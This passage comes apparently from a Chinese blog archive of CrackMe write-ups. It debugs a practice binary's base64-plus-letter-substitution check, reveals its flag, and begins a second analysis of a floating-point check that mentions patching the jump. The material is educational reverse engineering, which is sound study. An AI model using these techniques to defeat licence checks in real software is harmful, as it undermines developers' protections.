<p>可以看到要得到flag，jne就不能跳，也就是<code>test eax,eax</code>后的ZF=1，也就是eax=0<br>那这个eax=0从何而来？我们接着往上看<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">012411A0 | 55                       | push ebp                                 |</span><br><span class="line">012411A1 | 8B EC                    | mov ebp,esp                              |</span><br><span class="line">012411A3 | 83 EC 44                 | sub esp,44                               |</span><br><span class="line">012411A6 | A1 04 30 24 01           | mov eax,dword ptr ds:[1243004]           | eax:&quot;OTacMDMzMTI=&quot;</span><br><span class="line">012411AB | 33 C5                    | xor eax,ebp                              |</span><br><span class="line">012411AD | 89 45 FC                 | mov dword ptr ss:[ebp-4],eax             |</span><br><span class="line">012411B0 | 0F 57 C0                 | xorps xmm0,xmm0                          |</span><br><span class="line">012411B3 | C7 45 F8 00 00 00 00     | mov dword ptr ss:[ebp-8],0               |</span><br><span class="line">012411BA | 68 58 21 24 01           | push reverse3.1242158                    | 1242158:&quot;Please enter the flag:&quot;</span><br><span class="line">012411BF | 0F 11 45 E8              | movups xmmword ptr ss:[ebp-18],xmm0      |</span><br><span class="line">012411C3 | 0F 11 45 C0              | movups xmmword ptr ss:[ebp-40],xmm0      |</span><br><span class="line">012411C7 | 0F 11 45 D0              | movups xmmword ptr ss:[ebp-30],xmm0      |</span><br><span class="line">012411CB | 66 0F D6 45 E0           | movq qword ptr ss:[ebp-20],xmm0          |</span><br><span class="line">012411D0 | E8 1B 01 00 00           | call reverse3.12412F0                    |</span><br><span class="line">012411D5 | 8D 45 E8                 | lea eax,dword ptr ss:[ebp-18]            |</span><br><span class="line">012411D8 | 50                       | push eax                                 | eax:&quot;OTacMDMzMTI=&quot;</span><br><span class="line">012411D9 | 68 70 21 24 01           | push reverse3.1242170                    | 1242170:&quot;%20s&quot;</span><br><span class="line">012411DE | E8 CD 00 00 00           | call reverse3.12412B0                    |</span><br><span class="line">012411E3 | 8D 4D E8                 | lea ecx,dword ptr ss:[ebp-18]            | 你的输入 -&gt; ecx</span><br><span class="line">012411E6 | 83 C4 0C                 | add esp,C                                |</span><br><span class="line">012411E9 | 8D 51 01                 | lea edx,dword ptr ds:[ecx+1]             | 你的输入减第一个字节 -&gt; edx</span><br><span class="line">012411EC | 0F 1F 40 00              | nop dword ptr ds:[eax]                   | eax:&quot;OTacMDMzMTI=&quot;</span><br><span class="line">012411F0 | 8A 01                    | mov al,byte ptr ds:[ecx]                 |</span><br><span class="line">012411F2 | 41                       | inc ecx                                  |</span><br><span class="line">012411F3 | 84 C0                    | test al,al                               |</span><br><span class="line">012411F5 | 75 F9                    | jne reverse3.12411F0                     |</span><br><span class="line">012411F7 | 2B CA                    | sub ecx,edx                              | 你的输入的长度 -&gt; ecx</span><br><span class="line">012411F9 | 8D 55 E8                 | lea edx,dword ptr ss:[ebp-18]            | 输入 -&gt; edx</span><br><span class="line">012411FC | 56                       | push esi                                 | esi:&quot;TacMDMzMTI=&quot;</span><br><span class="line">012411FD | 51                       | push ecx                                 |</span><br><span class="line">012411FE | 51                       | push ecx                                 |</span><br><span class="line">012411FF | 8D 4D C0                 | lea ecx,dword ptr ss:[ebp-40]            |</span><br><span class="line">01241202 | E8 F9 FD FF FF           | call reverse3.1241000                    | base64(你的输入) -&gt; [ebp - 0x40]</span><br><span class="line">01241207 | 8D 4D C0                 | lea ecx,dword ptr ss:[ebp-40]            |</span><br><span class="line">0124120A | 83 C4 08                 | add esp,8                                |</span><br><span class="line">0124120D | 33 D2                    | xor edx,edx                              |</span><br><span class="line">0124120F | 8D 71 01                 | lea esi,dword ptr ds:[ecx+1]             | esi:&quot;TacMDMzMTI=&quot;</span><br><span class="line">01241212 | 8A 01                    | mov al,byte ptr ds:[ecx]                 |</span><br><span class="line">01241214 | 41                       | inc ecx                                  |</span><br><span class="line">01241215 | 84 C0                    | test al,al                               |</span><br><span class="line">01241217 | 75 F9                    | jne reverse3.1241212                     |</span><br><span class="line">01241219 | 2B CE                    | sub ecx,esi                              | 长度（base64你的输入） -&gt; ecx</span><br><span class="line">0124121B | 74 37                    | je reverse3.1241254                      |</span><br><span class="line">0124121D | 0F 1F 00                 | nop dword ptr ds:[eax]                   | eax:&quot;OTacMDMzMTI=&quot;</span><br><span class="line">01241220 | 8A 4C 15 C0              | mov cl,byte ptr ss:[ebp+edx-40]          |</span><br><span class="line">01241224 | 33 C0                    | xor eax,eax                              | eax:&quot;OTacMDMzMTI=&quot;</span><br><span class="line">01241226 | 3A 88 08 21 24 01        | cmp cl,byte ptr ds:[eax+1242108]         |</span><br><span class="line">0124122C | 74 08                    | je reverse3.1241236                      |</span><br><span class="line">0124122E | 40                       | inc eax                                  | eax:&quot;OTacMDMzMTI=&quot;</span><br><span class="line">0124122F | 83 F8 1A                 | cmp eax,1A                               | eax:&quot;OTacMDMzMTI=&quot;</span><br><span class="line">01241232 | 72 F2                    | jb reverse3.1241226                      |</span><br><span class="line">01241234 | EB 0A                    | jmp reverse3.1241240                     |</span><br><span class="line">01241236 | 8A 80 24 21 24 01        | mov al,byte ptr ds:[eax+1242124]         |</span><br><span class="line">0124123C | 88 44 15 C0              | mov byte ptr ss:[ebp+edx-40],al          |</span><br><span class="line">01241240 | 8D 4D C0                 | lea ecx,dword ptr ss:[ebp-40]            |</span><br><span class="line">01241243 | 42                       | inc edx                                  |</span><br><span class="line">01241244 | 8D 71 01                 | lea esi,dword ptr ds:[ecx+1]             | esi:&quot;TacMDMzMTI=&quot;</span><br><span class="line">01241247 | 8A 01                    | mov al,byte ptr ds:[ecx]                 |</span><br><span class="line">01241249 | 41                       | inc ecx                                  |</span><br><span class="line">0124124A | 84 C0                    | test al,al                               |</span><br><span class="line">0124124C | 75 F9                    | jne reverse3.1241247                     |</span><br><span class="line">0124124E | 2B CE                    | sub ecx,esi                              | esi:&quot;TacMDMzMTI=&quot;</span><br><span class="line">01241250 | 3B D1                    | cmp edx,ecx                              |</span><br><span class="line">01241252 | 72 CC                    | jb reverse3.1241220                      |</span><br><span class="line">01241254 | 6A 14                    | push 14                                  |</span><br><span class="line">01241256 | 8D 45 C0                 | lea eax,dword ptr ss:[ebp-40]            |</span><br><span class="line">01241259 | 68 40 21 24 01           | push reverse3.1242140                    | 1242140:&quot;o2Ffx3V0OjJtYW5spQ==&quot;</span><br><span class="line">0124125E | 50                       | push eax                                 | eax:&quot;OTacMDMzMTI=&quot;</span><br><span class="line">0124125F | FF 15 C4 20 24 01        | call dword ptr ds:[&lt;&amp;strncmp&gt;]           | 经过处理的base64与内置base64值比较，相等=&gt;eax=0</span><br><span class="line">01241265 | 83 C4 0C                 | add esp,C                                |</span><br><span class="line">01241268 | 5E                       | pop esi                                  | esi:&quot;TacMDMzMTI=&quot;</span><br><span class="line">01241269 | 85 C0                    | test eax,eax                             | zf=1 =&gt; eax=0</span><br><span class="line">0124126B | 75 07                    | jne reverse3.1241274                     |</span><br><span class="line">0124126D | 68 78 21 24 01           | push reverse3.1242178                    | 1242178:&quot;this is the right flag&quot;</span><br><span class="line">01241272 | EB 05                    | jmp reverse3.1241279                     |</span><br><span class="line">01241274 | 68 90 21 24 01           | push reverse3.1242190                    | 1242190:&quot;wrong input&quot;</span><br><span class="line">01241279 | FF 15 B0 20 24 01        | call dword ptr ds:[&lt;&amp;puts&gt;]              |</span><br><span class="line">0124127F | 8B 4D FC                 | mov ecx,dword ptr ss:[ebp-4]             |</span><br><span class="line">01241282 | 83 C4 04                 | add esp,4                                |</span><br><span class="line">01241285 | 33 CD                    | xor ecx,ebp                              |</span><br><span class="line">01241287 | 33 C0                    | xor eax,eax                              | eax:&quot;OTacMDMzMTI=&quot;</span><br><span class="line">01241289 | E8 92 00 00 00           | call reverse3.1241320                    |</span><br><span class="line">0124128E | 8B E5                    | mov esp,ebp                              |</span><br><span class="line">01241290 | 5D                       | pop ebp                                  |</span><br><span class="line">01241291 | C3                       | ret                                      |</span><br></pre></td></tr></table></figure></p>
<p>看来是这几行做了手脚，压入了两个参数<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">01241259 | 68 40 21 24 01           | push reverse3.1242140                    | 1242140:&quot;o2Ffx3V0OjJtYW5spQ==&quot;</span><br><span class="line">0124125E | 50                       | push eax                                 | eax:&quot;OTacMDMzMTI=&quot;</span><br><span class="line">0124125F | FF 15 C4 20 24 01        | call dword ptr ds:[&lt;&amp;strncmp&gt;]           | 经过处理的base64与内置base64值比较，相等=&gt;eax=0</span><br></pre></td></tr></table></figure></p>
<p>我们跟这个call进去看看<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">6C2F8C30 | 53                       | push ebx                                 |</span><br><span class="line">6C2F8C31 | 56                       | push esi                                 | esi:&quot;TacMDMzMTI=&quot;</span><br><span class="line">6C2F8C32 | 8B 4C 24 0C              | mov ecx,dword ptr ss:[esp+C]             | 我们输入的base64变形后的值</span><br><span class="line">6C2F8C36 | 8B 54 24 10              | mov edx,dword ptr ss:[esp+10]            | 内置base64值</span><br><span class="line">6C2F8C3A | 8B 5C 24 14              | mov ebx,dword ptr ss:[esp+14]            |</span><br><span class="line">6C2F8C3E | F7 C3 FF FF FF FF        | test ebx,FFFFFFFF                        |</span><br><span class="line">6C2F8C44 | 74 50                    | je ucrtbase.6C2F8C96                     |</span><br><span class="line">6C2F8C46 | 2B CA                    | sub ecx,edx                              |</span><br><span class="line">6C2F8C48 | F7 C2 03 00 00 00        | test edx,3                               |</span><br><span class="line">6C2F8C4E | 74 17                    | je ucrtbase.6C2F8C67                     |</span><br><span class="line">6C2F8C50 | 0F B6 04 0A              | movzx eax,byte ptr ds:[edx+ecx]          | edx+ecx*1:&quot;OTacMDMzMTI=&quot;</span><br><span class="line">6C2F8C54 | 3A 02                    | cmp al,byte ptr ds:[edx]                 |</span><br><span class="line">6C2F8C56 | 75 48                    | jne ucrtbase.6C2F8CA0                    |</span><br><span class="line">6C2F8C58 | 85 C0                    | test eax,eax                             | eax:&quot;OTacMDMzMTI=&quot;</span><br><span class="line">6C2F8C5A | 74 3A                    | je ucrtbase.6C2F8C96                     |</span><br><span class="line">6C2F8C5C | 42                       | inc edx                                  |</span><br><span class="line">6C2F8C5D | 83 EB 01                 | sub ebx,1                                |</span><br><span class="line">6C2F8C60 | 76 34                    | jbe ucrtbase.6C2F8C96                    |</span><br><span class="line">6C2F8C62 | F6 C2 03                 | test dl,3                                |</span><br><span class="line">6C2F8C65 | 75 E9                    | jne ucrtbase.6C2F8C50                    |</span><br><span class="line">6C2F8C67 | 8D 04 0A                 | lea eax,dword ptr ds:[edx+ecx]           | eax:&quot;OTacMDMzMTI=&quot;</span><br><span class="line">6C2F8C6A | 25 FF 0F 00 00           | and eax,FFF                              | eax:&quot;OTacMDMzMTI=&quot;</span><br><span class="line">6C2F8C6F | 3D FC 0F 00 00           | cmp eax,FFC                              | eax:&quot;OTacMDMzMTI=&quot;</span><br><span class="line">6C2F8C74 | 77 DA                    | ja ucrtbase.6C2F8C50                     |</span><br><span class="line">6C2F8C76 | 8B 04 0A                 | mov eax,dword ptr ds:[edx+ecx]           | eax:&quot;OTacMDMzMTI=&quot;</span><br><span class="line">6C2F8C79 | 3B 02                    | cmp eax,dword ptr ds:[edx]               | eax:&quot;OTacMDMzMTI=&quot;</span><br><span class="line">6C2F8C7B | 75 D3                    | jne ucrtbase.6C2F8C50                    |</span><br><span class="line">6C2F8C7D | 83 EB 04                 | sub ebx,4                                |</span><br><span class="line">6C2F8C80 | 76 14                    | jbe ucrtbase.6C2F8C96                    |</span><br><span class="line">6C2F8C82 | 8D B0 FF FE FE FE        | lea esi,dword ptr ds:[eax-1010101]       | esi:&quot;TacMDMzMTI=&quot;</span><br><span class="line">6C2F8C88 | 83 C2 04                 | add edx,4                                |</span><br><span class="line">6C2F8C8B | F7 D0                    | not eax                                  | eax:&quot;OTacMDMzMTI=&quot;</span><br><span class="line">6C2F8C8D | 23 C6                    | and eax,esi                              | eax:&quot;OTacMDMzMTI=&quot;, esi:&quot;TacMDMzMTI=&quot;</span><br><span class="line">6C2F8C8F | A9 80 80 80 80           | test eax,80808080                        | eax:&quot;OTacMDMzMTI=&quot;</span><br><span class="line">6C2F8C94 | 74 D1                    | je ucrtbase.6C2F8C67                     |</span><br><span class="line">6C2F8C96 | 33 C0                    | xor eax,eax                              | eax:&quot;OTacMDMzMTI=&quot;</span><br><span class="line">6C2F8C98 | 5E                       | pop esi                                  | esi:&quot;TacMDMzMTI=&quot;</span><br><span class="line">6C2F8C99 | 5B                       | pop ebx                                  |</span><br><span class="line">6C2F8C9A | C3                       | ret                                      |</span><br><span class="line">6C2F8C9B | EB 03                    | jmp ucrtbase.6C2F8CA0                    |</span><br><span class="line">6C2F8C9D | CC                       | int3                                     |</span><br><span class="line">6C2F8C9E | CC                       | int3                                     |</span><br><span class="line">6C2F8C9F | CC                       | int3                                     |</span><br><span class="line">6C2F8CA0 | 1B C0                    | sbb eax,eax                              | eax:&quot;OTacMDMzMTI=&quot;</span><br><span class="line">6C2F8CA2 | 83 C8 01                 | or eax,1                                 | eax:&quot;OTacMDMzMTI=&quot;</span><br><span class="line">6C2F8CA5 | 5E                       | pop esi                                  | esi:&quot;TacMDMzMTI=&quot;</span><br><span class="line">6C2F8CA6 | 5B                       | pop ebx                                  |</span><br><span class="line">6C2F8CA7 | C3                       | ret                                      |</span><br></pre></td></tr></table></figure></p>
<p>这段代码的跳转比较复杂，我们主要看这段<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">6C2F8C50 | 0F B6 04 0A              | movzx eax,byte ptr ds:[edx+ecx]          | edx+ecx*1:&quot;OTacMDMzMTI=&quot;</span><br><span class="line">6C2F8C54 | 3A 02                    | cmp al,byte ptr ds:[edx]                 | edx:&quot;o2Ffx3V0OjJtYW5spQ==&quot;</span><br><span class="line">6C2F8C56 | 75 48                    | jne ucrtbase.6C2F8CA0                    |</span><br><span class="line">6C2F8C58 | 85 C0                    | test eax,eax                             |</span><br><span class="line">6C2F8C5A | 74 3A                    | je ucrtbase.6C2F8C96                     |</span><br><span class="line">6C2F8C5C | 42                       | inc edx                                  | edx:&quot;o2Ffx3V0OjJtYW5spQ==&quot;</span><br><span class="line">6C2F8C5D | 83 EB 01                 | sub ebx,1                                |</span><br><span class="line">6C2F8C60 | 76 34                    | jbe ucrtbase.6C2F8C96                    |</span><br><span class="line">6C2F8C62 | F6 C2 03                 | test dl,3                                |</span><br><span class="line">6C2F8C65 | 75 E9                    | jne ucrtbase.6C2F8C50                    |</span><br><span class="line">6C2F8C67 | 8D 04 0A                 | lea eax,dword ptr ds:[edx+ecx]           | edx+ecx*1:&quot;OTacMDMzMTI=&quot;</span><br><span class="line">6C2F8C6A | 25 FF 0F 00 00           | and eax,FFF                              |</span><br><span class="line">6C2F8C6F | 3D FC 0F 00 00           | cmp eax,FFC                              |</span><br><span class="line">6C2F8C74 | 77 DA                    | ja ucrtbase.6C2F8C50                     |</span><br></pre></td></tr></table></figure></p>
<p>通读可以发现就是把我们输入的base64变形后的值(<code>OTacMDMzMTI=</code>)按字节取出来一一和内置的<code>o2Ffx3V0OjJtYW5spQ==</code>做比较，只有当全部相等才跳到这把eax置零<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">6C2F8C96 | 33 C0                    | xor eax,eax</span><br></pre></td></tr></table></figure></p>
<p>然后退出函数</p>
<p>那么这个<code>OTacMDMzMTI=</code>是个什么呢？看着是个base64，但是我们解出来是<code>96?3312</code>，完全不是我们输入的<code>97103012</code>了，这个只怎么来的呢？我们继续看这段<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">012411FF | 8D 4D C0                 | lea ecx,dword ptr ss:[ebp-40]            |</span><br><span class="line">01241202 | E8 F9 FD FF FF           | call reverse3.1241000                    |base64(你的输入) -&gt; [ebp - 0x40]</span><br><span class="line">01241207 | 8D 4D C0                 | lea ecx,dword ptr ss:[ebp-40]            |</span><br><span class="line">0124120A | 83 C4 08                 | add esp,8                                |</span><br><span class="line">0124120D | 33 D2                    | xor edx,edx                              | edx:&quot;97103012&quot;</span><br><span class="line">0124120F | 8D 71 01                 | lea esi,dword ptr ds:[ecx+1]             |</span><br><span class="line">01241212 | 8A 01                    | mov al,byte ptr ds:[ecx]                 |</span><br><span class="line">01241214 | 41                       | inc ecx                                  |</span><br><span class="line">01241215 | 84 C0                    | test al,al                               |</span><br><span class="line">01241217 | 75 F9                    | jne reverse3.1241212                     |</span><br><span class="line">01241219 | 2B CE                    | sub ecx,esi                              | 长度（base64你的输入） -&gt; ecx</span><br><span class="line">0124121B | 74 37                    | je reverse3.1241254                      |</span><br><span class="line">0124121D | 0F 1F 00                 | nop dword ptr ds:[eax]                   |</span><br><span class="line">01241220 | 8A 4C 15 C0              | mov cl,byte ptr ss:[ebp+edx-40]          |</span><br><span class="line">01241224 | 33 C0                    | xor eax,eax                              |</span><br><span class="line">01241226 | 3A 88 08 21 24 01        | cmp cl,byte ptr ds:[eax+1242108]         | eax+1242108:&quot;abcdefghijklmnopqrstuvwxyz&quot;</span><br><span class="line">0124122C | 74 08                    | je reverse3.1241236                      |</span><br><span class="line">0124122E | 40                       | inc eax                                  |</span><br><span class="line">0124122F | 83 F8 1A                 | cmp eax,1A                               |</span><br><span class="line">01241232 | 72 F2                    | jb reverse3.1241226                      |</span><br><span class="line">01241234 | EB 0A                    | jmp reverse3.1241240                     |</span><br><span class="line">01241236 | 8A 80 24 21 24 01        | mov al,byte ptr ds:[eax+1242124]         | eax+1242124:&quot;wxabopdefghijklqrstuvyzcmn&quot;</span><br><span class="line">0124123C | 88 44 15 C0              | mov byte ptr ss:[ebp+edx-40],al          |</span><br><span class="line">01241240 | 8D 4D C0                 | lea ecx,dword ptr ss:[ebp-40]            |</span><br><span class="line">01241243 | 42                       | inc edx                                  | edx:&quot;97103012&quot;</span><br><span class="line">01241244 | 8D 71 01                 | lea esi,dword ptr ds:[ecx+1]             |</span><br><span class="line">01241247 | 8A 01                    | mov al,byte ptr ds:[ecx]                 |</span><br><span class="line">01241249 | 41                       | inc ecx                                  |</span><br><span class="line">0124124A | 84 C0                    | test al,al                               |</span><br><span class="line">0124124C | 75 F9                    | jne reverse3.1241247                     |</span><br><span class="line">0124124E | 2B CE                    | sub ecx,esi                              |</span><br><span class="line">01241250 | 3B D1                    | cmp edx,ecx                              | edx:&quot;97103012&quot;</span><br><span class="line">01241252 | 72 CC                    | jb reverse3.1241220                      |</span><br><span class="line">01241254 | 6A 14                    | push 14                                  |</span><br></pre></td></tr></table></figure></p>
<p>下面这行代码有兴趣的可以跟进去看看，其实就是base64编码，苦逼的我傻乎乎地跟完了<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">01241202 | E8 F9 FD FF FF           | call reverse3.1241000                    |base64(你的输入) -&gt; [ebp - 0x40]</span><br></pre></td></tr></table></figure></p>
<p>那<code>97103012</code>的base64是<code>OTcxMDMwMTI=</code>呀，这个<code>OTacMDMzMTI=</code>是怎么来的呢？我们看着一段<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">01241220 | 8A 4C 15 C0              | mov cl,byte ptr ss:[ebp+edx-40]          |</span><br><span class="line">01241224 | 33 C0                    | xor eax,eax                              |</span><br><span class="line">01241226 | 3A 88 08 21 24 01        | cmp cl,byte ptr ds:[eax+1242108]         | eax+1242108:&quot;abcdefghijklmnopqrstuvwxyz&quot;</span><br><span class="line">0124122C | 74 08                    | je reverse3.1241236                      |</span><br><span class="line">0124122E | 40                       | inc eax                                  |</span><br><span class="line">0124122F | 83 F8 1A                 | cmp eax,1A                               |</span><br><span class="line">01241232 | 72 F2                    | jb reverse3.1241226                      |</span><br><span class="line">01241234 | EB 0A                    | jmp reverse3.1241240                     |</span><br><span class="line">01241236 | 8A 80 24 21 24 01        | mov al,byte ptr ds:[eax+1242124]         | eax+1242124:&quot;wxabopdefghijklqrstuvyzcmn&quot;</span><br><span class="line">0124123C | 88 44 15 C0              | mov byte ptr ss:[ebp+edx-40],al          |</span><br><span class="line">01241240 | 8D 4D C0                 | lea ecx,dword ptr ss:[ebp-40]            |</span><br><span class="line">01241243 | 42                       | inc edx                                  | edx:&quot;97103012&quot;</span><br><span class="line">01241244 | 8D 71 01                 | lea esi,dword ptr ds:[ecx+1]             |</span><br><span class="line">01241247 | 8A 01                    | mov al,byte ptr ds:[ecx]                 |</span><br><span class="line">01241249 | 41                       | inc ecx                                  |</span><br><span class="line">0124124A | 84 C0                    | test al,al                               |</span><br><span class="line">0124124C | 75 F9                    | jne reverse3.1241247                     |</span><br><span class="line">0124124E | 2B CE                    | sub ecx,esi                              |</span><br><span class="line">01241250 | 3B D1                    | cmp edx,ecx                              | edx:&quot;97103012&quot;</span><br><span class="line">01241252 | 72 CC                    | jb reverse3.1241220                      |</span><br></pre></td></tr></table></figure></p>
<p>这一段的工作大家跟跟就知道，就是通过一次次循环将<code>OTcxMDMwMTI=</code>中的值通过下面这个对应关系一一置换<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">abcdefghijklmnopqrstuvwxyz</span><br><span class="line">wxabopdefghijklqrstuvyzcmn</span><br></pre></td></tr></table></figure></p>
<p>所以<code>OTcxMDMwMTI=</code>变成了<code>OTacMDMzMTI=</code>  </p>
<p>好的，我们看到了这里，相信已经知道密码是什么了，也就是我们变形后的base64值要等于<code>o2Ffx3V0OjJtYW5spQ==</code><br>那就倒着置换呗，得出来正确的base64是<code>e2Fib3V0OmJsYW5rfQ==</code>，解码为<code>{about:blank}</code></p>
<p><img src="https://raw.githubusercontent.com/akkuman/pic/master/img/c0264382gy1fjpd8arx26j20og0ge0tq.jpg" alt=""></p>
<p><a href="https://pan.baidu.com/s/1mi63WXM" target="_blank" rel="noopener">例子CM</a></p>
]]></content>
      <categories>
        <category>逆向</category>
      </categories>
      <tags>
        <tag>CrackMe</tag>
        <tag>逆向</tag>
      </tags>
  </entry>
  <entry>
    <title>一个涉及到浮点寄存器的CM</title>
    <url>/2017/09/18/%E4%B8%80%E4%B8%AA%E6%B6%89%E5%8F%8A%E5%88%B0%E6%B5%AE%E7%82%B9%E5%AF%84%E5%AD%98%E5%99%A8%E7%9A%84CM.html</url>
    <content><![CDATA[<p>这次找小伙伴要了他的一个CM，怎么说呢，这CM让我学到了不少，其实搞出来后感觉不难，就是有不少FPU浮点相关的指令和FPU寄存器完全没学过，查了不少资料，学到了很多<br><a id="more"></a><br>打开是这样<br><img src="https://raw.githubusercontent.com/akkuman/pic/master/img/c0264382gy1fjo0hr07rpj20bv07qq3v.jpg" alt=""></p>
<p>无壳程序，我们直接od查找字符串，爆破我就不说了，直接改跳转<br>我第一次是找到这个判断的函数开头，一行行快速单步，确实发现了输入，但是后来很多命令不懂意思我也单步，导致看到后来也不知道怎么判断的<br>然后我改了策略，先逆着就近看看，怎么才能使条件成立<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">004010EA  |.  F6C4 41       test ah,0x41                             ;  zf=0 -&gt; ah &amp; 0x41 != 0</span><br><span class="line">004010ED  |.  B8 00000000   mov eax,0x0</span><br><span class="line">004010F2  |.  0f95c0        setne al                                 ;  eax=1 -&gt; al=1 -&gt; zf=0</span><br><span class="line">004010F5  |.  8945 D0       mov [local.12],eax</span><br><span class="line">004010F8  |.  837D D0 01    cmp [local.12],0x1</span><br><span class="line">004010FC  |.  0F85 39000000 jnz 测试.0040113B                          ;  要求zf=1，即eax=0x1</span><br><span class="line">00401102  |.  BB 06000000   mov ebx,0x6</span><br><span class="line">00401107  |.  E8 F8FEFFFF   call 测试.00401004</span><br><span class="line">0040110C  |.  68 01030080   push 0x80000301</span><br><span class="line">00401111  |.  6A 00         push 0x0</span><br><span class="line">00401113  |.  68 00000000   push 0x0</span><br><span class="line">00401118  |.  68 04000080   push 0x80000004</span><br><span class="line">0040111D  |.  6A 00         push 0x0</span><br><span class="line">0040111F  |.  68 6D1B4800   push 测试.00481B6D                         ;  成功</span><br><span class="line">00401124  |.  68 04000000   push 0x4</span><br><span class="line">00401129  |.  BB 90164000   mov ebx,测试.00401690</span><br><span class="line">0040112E  |.  E8 36010000   call 测试.00401269</span><br><span class="line">00401133  |.  83C4 34       add esp,0x34</span><br><span class="line">00401136  |.  E9 34000000   jmp 测试.0040116F</span><br><span class="line">0040113B  |&gt;  BB 06000000   mov ebx,0x6</span><br><span class="line">00401140  |.  E8 BFFEFFFF   call 测试.00401004</span><br><span class="line">00401145  |.  68 01030080   push 0x80000301</span><br><span class="line">0040114A  |.  6A 00         push 0x0</span><br><span class="line">0040114C  |.  68 00000000   push 0x0</span><br><span class="line">00401151  |.  68 04000080   push 0x80000004</span><br><span class="line">00401156  |.  6A 00         push 0x0</span><br><span class="line">00401158  |.  68 721B4800   push 测试.00481B72                         ;  失败</span><br><span class="line">0040115D  |.  68 04000000   push 0x4</span><br></pre></td></tr></table></figure></p>
<p>也就是说需要找ah相关的<br>接下来我们整体看看，因为第一次接触FPU浮点相关的指令和FPU寄存器，所以注释写的比较繁琐，望大家见谅<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">0040100C  /.  55            push ebp</span><br><span class="line">0040100D  |.  8BEC          mov ebp,esp</span><br><span class="line">0040100F  |.  81EC 34000000 sub esp,0x34</span><br><span class="line">00401015  |.  6A FF         push -0x1</span><br><span class="line">00401017  |.  6A 08         push 0x8</span><br><span class="line">00401019  |.  68 02000116   push 0x16010002</span><br><span class="line">0040101E  |.  68 01000152   push 0x52010001</span><br><span class="line">00401023  |.  E8 47020000   call 测试.0040126F                         ;  执行后   输入的密码 -&gt; eax(1886b8)</span><br><span class="line">00401028  |.  83C4 10       add esp,0x10</span><br><span class="line">0040102B  |.  8945 FC       mov [local.1],eax                        ;  eax中你的输入 -&gt; ebp-4</span><br><span class="line">0040102E  |.  68 04000080   push 0x80000004</span><br><span class="line">00401033  |.  6A 00         push 0x0</span><br><span class="line">00401035  |.  8B45 FC       mov eax,[local.1]</span><br><span class="line">00401038  |.  85C0          test eax,eax</span><br><span class="line">0040103A  |.  75 05         jnz short 测试.00401041</span><br><span class="line">0040103C  |.  B8 5C1B4800   mov eax,测试.00481B5C</span><br><span class="line">00401041  |&gt;  50            push eax</span><br><span class="line">00401042  |.  68 01000000   push 0x1</span><br><span class="line">00401047  |.  BB A0134000   mov ebx,测试.004013A0</span><br><span class="line">0040104C  |.  E8 18020000   call 测试.00401269                         ;  eax=16进制(你的输入)   ecx=0</span><br><span class="line">00401051  |.  83C4 10       add esp,0x10                             ;  esp = 1000b</span><br><span class="line">00401054  |.  8945 F8       mov [local.2],eax                        ;  16进制(你的输入) -&gt; local.2</span><br><span class="line">00401057  |.  8B5D FC       mov ebx,[local.1]                        ;  你的输入 -&gt; ebx</span><br><span class="line">0040105A  |.  85DB          test ebx,ebx</span><br><span class="line">0040105C  |.  74 09         je short 测试.00401067</span><br><span class="line">0040105E  |.  53            push ebx                                 ;  输入压栈 ebp-38  local.14</span><br><span class="line">0040105F  |.  E8 F9010000   call 测试.0040125D</span><br><span class="line">00401064  |.  83C4 04       add esp,0x4                              ;  [ebp-38] + 4</span><br><span class="line">00401067  |&gt;  DB45 F8       fild [local.2]                           ;  十进制浮点(输入) -&gt; st0</span><br><span class="line">0040106A  |.  DD5D F0       fstp qword ptr ss:[ebp-0x10]             ;  st0 -&gt; ebp-10H</span><br><span class="line">0040106D  |.  DD45 F0       fld qword ptr ss:[ebp-0x10]              ;  ebp-10 -&gt; st0</span><br><span class="line">00401070  |.  DC05 5D1B4800 fadd qword ptr ds:[0x481B5D]             ;  st0 = st0 + 520</span><br><span class="line">00401076  |.  DD5D E8       fstp qword ptr ss:[ebp-0x18]             ;  十进制你的输入+520 -&gt; ebp-18H</span><br><span class="line">00401079  |.  6A FF         push -0x1</span><br><span class="line">0040107B  |.  6A 08         push 0x8</span><br><span class="line">0040107D  |.  68 03000116   push 0x16010003</span><br><span class="line">00401082  |.  68 01000152   push 0x52010001</span><br><span class="line">00401087  |.  E8 E3010000   call 测试.0040126F</span><br><span class="line">0040108C  |.  83C4 10       add esp,0x10</span><br><span class="line">0040108F  |.  8945 E4       mov [local.7],eax</span><br><span class="line">00401092  |.  68 04000080   push 0x80000004</span><br><span class="line">00401097  |.  6A 00         push 0x0</span><br><span class="line">00401099  |.  8B45 E4       mov eax,[local.7]</span><br><span class="line">0040109C  |.  85C0          test eax,eax</span><br><span class="line">0040109E  |.  75 05         jnz short 测试.004010A5</span><br><span class="line">004010A0  |.  B8 5C1B4800   mov eax,测试.00481B5C</span><br><span class="line">004010A5  |&gt;  50            push eax</span><br><span class="line">004010A6  |.  68 01000000   push 0x1</span><br><span class="line">004010AB  |.  BB A0134000   mov ebx,测试.004013A0</span><br><span class="line">004010B0  |.  E8 B4010000   call 测试.00401269</span><br><span class="line">004010B5  |.  83C4 10       add esp,0x10</span><br><span class="line">004010B8  |.  8945 E0       mov [local.8],eax</span><br><span class="line">004010BB  |.  8B5D E4       mov ebx,[local.7]</span><br><span class="line">004010BE  |.  85DB          test ebx,ebx</span><br><span class="line">004010C0  |.  74 09         je short 测试.004010CB</span><br><span class="line">004010C2  |.  53            push ebx</span><br><span class="line">004010C3  |.  E8 95010000   call 测试.0040125D</span><br><span class="line">004010C8  |.  83C4 04       add esp,0x4</span><br><span class="line">004010CB  |&gt;  DB45 E0       fild [local.8]                           ;  (641)10 -&gt; st0</span><br><span class="line">004010CE  |.  DD5D D8       fstp qword ptr ss:[ebp-0x28]             ;  st0 -&gt; ebp-28H</span><br><span class="line">004010D1  |.  DD45 E8       fld qword ptr ss:[ebp-0x18]              ;  [ebp-18H](十进制你的输入+520) -&gt; st0</span><br><span class="line">004010D4  |.  DC65 D8       fsub qword ptr ss:[ebp-0x28]             ;  st0 = st0 - [ebp-28H]  (641)10</span><br><span 